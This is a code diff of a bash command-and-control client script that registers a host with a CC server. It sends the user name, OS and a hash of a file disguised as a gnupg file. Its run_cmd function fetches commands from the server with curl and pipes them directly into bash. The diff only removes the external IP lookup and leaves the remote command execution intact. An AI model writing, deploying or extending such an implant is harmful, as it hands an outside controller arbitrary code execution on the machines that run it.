@@ -4,7 +4,6 @@ cc_server=http://localhost:41450
 
 #Gather basic system information
 user=$(whoami)
-ip_addr=$(curl -s https://now-dns.com/ip)
 operating_sys=$(uname)
 
 hash_type=sha256sum
@@ -30,7 +29,7 @@ function register() {
     #Calculate hash from the file with random data and use as identification
 	hash_sum=$($hash_type $seed_dir/.seed_gnupg~ | egrep -o '^\S+')
     #Send information to the CC server in a POST request to do a first time registration
-	curl -d "hash_type=$hash_type&hash_sum=$hash_sum&operating_sys=$operating_sys&user=$user&ip_addr=$ip_addr" $cc_server/convey/register/
+	curl -d "hash_type=$hash_type&hash_sum=$hash_sum&operating_sys=$operating_sys&user=$user" $cc_server/convey/register/
 }
 
 function init_systemd() {
@@ -54,7 +53,7 @@ function run_cmd() {
 	hash_sum=$($hash_type $seed_dir/.seed_gnupg~ | egrep -o '.+\s')
     #Send hash and current IP address (for sake of updating info) in a POST request
     #CC server will return a command. This is then piped directly to bash and executed
-	curl -sLd "hash_sum=$hash_sum&ip_addr=$ip_addr" $cc_server/convey/cmd/ | bash
+	curl -sLd "hash_sum=$hash_sum" $cc_server/convey/cmd/ | bash
 }
 
 
